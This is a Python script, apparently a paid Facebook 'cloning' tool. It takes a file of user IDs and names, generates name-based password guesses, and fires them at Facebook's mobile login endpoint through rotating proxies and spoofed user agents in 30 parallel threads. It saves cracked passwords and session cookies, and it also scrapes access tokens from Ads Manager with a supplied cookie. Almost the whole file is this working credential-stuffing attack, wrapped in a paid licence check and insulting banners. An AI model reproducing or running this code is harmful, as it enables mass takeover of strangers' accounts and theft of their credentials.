#Telegram:TEAM-ATC-CYBER-71
#OWNER : TEAM ATC(AKASH)OWNER
#GITHUB:GW-AKASH
#-----------------[ AKASH ]-------------------#
 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
 #------------------[ AKASH CHOWDHURY ]-------------------#
import os, platform, time, sys
#------------------[ AKASH CHOWDHURY]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A716S Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-J700P Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101",]
ua = ["Mozilla/5.0 (Linux; Android 10; RMX2200 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.44.117",]
ua = ["Mozilla/5.0 (Linux; Android 10; RMX2173 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;] FBNV/1",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/17.2 Safari/605.1.15 (AirWatch Browser v23.09.1)",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.124 Mobile/15E148 Safari/604.1",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia G22 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.44.117",]
ua = ["Mozilla/5.0 (Linux; Android 13; ALI-AN00 Build/HONORALI-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64",]
ua = ["Mozilla/5.0 (Linux; Android 10; KOZ-AL40 Build/HONORKOZ-AL40; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/306.1.0.40.119",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2302EPCC4I Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.193 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118",]
ua = ["Mozilla/5.0 (Linux; Android 12; 220733SPI Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX2205 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118",]
ua = ["Mozilla/5.0 (Linux; Android 12; RMX2071 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118",]
ua = ["Mozilla/5.0 (Linux; Android 13; TECNO AD10 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118",]
ua = ["Mozilla/5.0 (Linux; Android 13; TECNO KJ5 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;] FBNV/1",]

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
try:
    prox= requests.get('https://github.com/MAHADI-143/BDMC/blob/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Linux; Android 13; TECNO KJ5/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'.{c} {d}{e}{f}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 13; 2302EPCC4I)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} ; {c}{d}{e}{f}) {h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (Linux; Android 13; RMX2205)'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'/{c}{d}{e}{f}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/tonmoy404-cyber/FILE_X/blob/main/tonmoy_ua.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ AKASH- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\033[1;93m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def AKASH(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
    os.system('xdg-open https://t.me/akashking00')
logo="""
\033[1;92m \x1b[38;5;46m            ┏┓┳┓┏┓┏┓┏┳┓  ┓┏┓┳┳┓┏┓
\033[1;92m \x1b[38;5;47m            ┣┫┣┫┣ ┣┫ ┃ ━━┃┫ ┃┃┃┃┓
\033[1;92m \x1b[38;5;48m            ┛┗┛┗┻ ┛┗ ┻   ┛┗┛┻┛┗┗┛  \033[1;37mV\033[1;92m/\033[1;37m5.0

\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[\033[1;37m=\033[1;91m] \033[1;92mDEVELOPER \033[1;37m• \033[1;92mA R A F A T - K I N G
\033[1;91m[\033[1;37m=\033[1;91m]\033[1;92m FACEBOOK \033[1;37m • \033[1;92mA R A F A T
\033[1;91m[\033[1;37m=\033[1;91m]\033[1;92m TOOLTYPE \033[1;37m •\033[1;92m PAID\033[1;91m-\033[0;47m\033[1;91mFILE CLONING\033[0;92m
\033[1;91m[\033[1;37m=\033[1;91m]\033[1;92m GITHUB    \033[1;37m• \033[1;91m(\033[1;37mARAFAT-404\033[1;91m)
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 250TK 30 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
xudinaministar =(""" \033[32;1m[-] Importent Note """)
hedaborakarent =(""" \033[32;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 """)
#____APPROVAL SYSTEM ADD_____#
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Arafat-xd/Approval.txt/blob/main/Approval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
     # print(" \033[32;1m[+] Your Kay : "+id)
      print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32m15 Days 300 Taka \033[0;92m")
      print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;32m30 Days 600 Taka \033[0;92m")
      print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32mCource + Comand 30 Days 1000 Taka \033[0;92m")
      print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m Akash TooLs Daily Update)✅ \033[0;92m")
      print("\033[1;39m┏━[\033[1;32m●\033[1;39m] \033[1;32mNote : \033[0;41mByPass: User Fuck Your Mother):\033[0;92m")
      print("\033[1;39m┗━━━━━━━━━━━━\033[1;32mFREE USER NOT COME INBOX ??\033[0;92m")
      print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;36m==================== \033[0;92m")
      print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;33mFREE-FIRE-ID CLONING \033[0;92m")
      print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32mONLY ACTIVE ID CLONING \033[0;92m")
      print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;33mUnActive id Not Allow \033[0;92m")
      print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32mCp id Login 60% \033[0;92m")
      print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;33mWi-fi Working 80% \033[0;92m")
      print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32mYour Key:\033[0;41m "+ id)
      input("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32mPress Enter To Send Key\033[0;92m")
      tks = ('Assalamu%20Alaikum🌺%20!%20Please%20Approve%20My%20Key%20Team%20Atc%20Cyber%20:%20'+id);os.system('am start https://wa.me/+8801778809977?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python AKASH.py")
def naima():
	print('-------------------')
print(logo)

def back():
	login()
	
 
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python nono.py")
        exit()

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
#    print("\033[38;5;21m[\033[38;5;23m1\033[38;5;21m] \033[38;5;190m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[38;5;125m :\033[38;5;125m "+uname)
 #   print("\033[38;5;21m[\033[38;5;23m1\033[38;5;21m] \033[38;5;190mTODAY'S DATE :\033[38;5;125m "+date)
 #   print('\033[0;97m===============================================')
    print("\033[1;91m [\033[1;37m1\033[1;91m] \033[1;92m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚                  """)
    #print("\033[1;96m [2] 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗖𝗛𝗔𝗡𝗡𝗘𝗟                  """)
   # print("        \033[0;47m\033[1;91m𝗡𝗢𝗧𝗜𝗖𝗘\033[0;92m""")
   # print("\033[1;97m    𝗧𝗘𝗔𝗠-𝗔𝗧𝗖-𝗕𝗥𝗔𝗡𝗗                """)
    print("\033[1;91m [\033[1;37m+\033[1;91m]\033[1;92m 𝗘𝗫𝗜𝗧""")
    print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    AKASH = input("\033[1;91m[\033[1;37m=\033[1;91m] \033[1;92mCHOICE ❯ ")
    if AKASH in ['111']:
        login()
        dump_massal()
    elif AKASH in ['1']:
        crack_file()
    elif AKASH in ['2','02']:
        os.system('xdg-open https://t.me/akashking00/')
        os.system("python nono.py")
    elif AKASH in ['+','0']:
        result()
    elif AKASH in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    os.system('clear')
    print(logo)
   # print('\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    #os.system('espeak -a 300 " your file name"')
    print("\033[1;91m[\033[1;37m=\033[1;91m] \033[1;92mExample [\033[1;37m/sdcard/file.txt\033[1;91m]")
    print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    o = input("\033[1;91m[\033[1;37m=\033[1;91m] \033[1;92mFile Path   \033[1;91m–\033[1;37m ")
    try:lin = open(o).read().splitlines()
    except:
        print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        animation('\033[1;96m [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    os.system('clear')
    print(logo)
    #print('\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print("\033[1;91m[\033[1;37m1\033[1;91m] \033[1;92mOLD IDz")
    print("\033[1;91m[\033[1;37m2\033[1;91m] \033[1;92mNEW IDz")
    print("\033[1;91m[\033[1;37m3\033[1;91m] \033[1;92mMIX IDz")
    print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    hu = input("\033[1;91m[\033[1;37m=\033[1;91m] \033[1;92mCHOICE ❯ ")
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    os.system('clear')
    print(logo)
    print("\033[1;91m[\033[1;37m1\033[1;91m] \033[1;37mOK ID +COOKES\033[1;91m-\033[1;37mBEST")
    print("\033[1;91m[\033[1;37m2\033[1;91m] \033[1;92mOK ID+CP ID ")
    print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
   ## os.system('espeak -a 300 "Method, Choice, one, best"')
    hc = input("\033[1;91m[\033[1;37m=\033[1;91m] \033[1;92mCHOICE ❯ ")
  ##  os.system("xdg-open https://t.me/akashking00")
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print('\033[1;92m 𝙏𝙊𝙏𝘼𝙇 𝙄𝘿𝙕 :\033[1;37m ',str(len(id))) 
    print("\033[1;93m 𝘼𝙄𝙍𝙋𝙇𝘼𝙉𝙀 𝙈𝙊𝘿𝙀 \033[1;91m[\033[1;37m𝙊𝙉\033[1;91m=\033[1;37m𝙊𝙁𝙁\033[1;92m]\033[1;92m 𝙁𝙊𝙍 𝙊𝙆 𝙄𝘿𝙕 ")
    print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'22')
                    pwv.append(frs+'@12')                                        
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'@1234')                   
                    pwv.append(nmf)
                    pwv.append(frs+'12345')
                    pwv.append(frs+'gaming')
                    pwv.append(frs+'#@')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'#11')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@11')
                    pwv.append(frs+'@22')                
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'22')
                    pwv.append(frs+'@12')                                        
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'@1234')                   
                    pwv.append(nmf)
                    pwv.append(frs+'12345')
                    pwv.append(frs+'gaming')
                    pwv.append(frs+'#@')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'#11')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@11')
                    pwv.append(frs+'@22')               
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\033[1;93m[\033[1;93m+\033[1;93m] CLONING COMPLETE TIME :\033[1;93m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[1;93m[\033[1;93m•\033[1;93m] OK :\033[1;93m %s '%(ok))
    print('\033[1;93m[\033[1;93m+\033[1;93m] CP :\033[1;93m %s '%(cp))
    print('\n\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    woi = input('\033[1;93m[\033[1;93m+\033[1;93m] \033[1;93m ENTER TO BACK')
    os.system("python AKASH-6-3.py")
    exit()
 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,CP
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;92m{bo}[ARAFAT-XD]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="118"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[1;92m\033[1;92m[\033[1;91mARAFAT-CP🖤\033[1;92m] \033[1;92m\033[1;92m[\033[1;92mNUM\033[1;37m]> {idf} \033[1;92m\033[1;92m[\033[1;92mPASS\033[1;92m]> \033[1;37m{pw}')
                print(f'\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━───\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\r\x1b[38;5;50m\x1b[38;5;50m[\x1b[38;5;50mARAFAT-OK💙\x1b[38;5;50m] \x1b[38;5;50m\x1b[38;5;50m[\x1b[38;5;50m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\x1b[38;5;50m]= \033[1;93m{idf} \x1b[38;5;50m\x1b[38;5;50m[\x1b[38;5;50m𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿\x1b[38;5;50m]= \033[1;93m{pw}\n\x1b[38;5;50m𝘾𝙊𝙊𝙆𝙀𝙎 \x1b[38;5;50m[🌸]\x1b[38;5;50m=\x1b[38;5;50m= \033[1;37m{kuki} ')
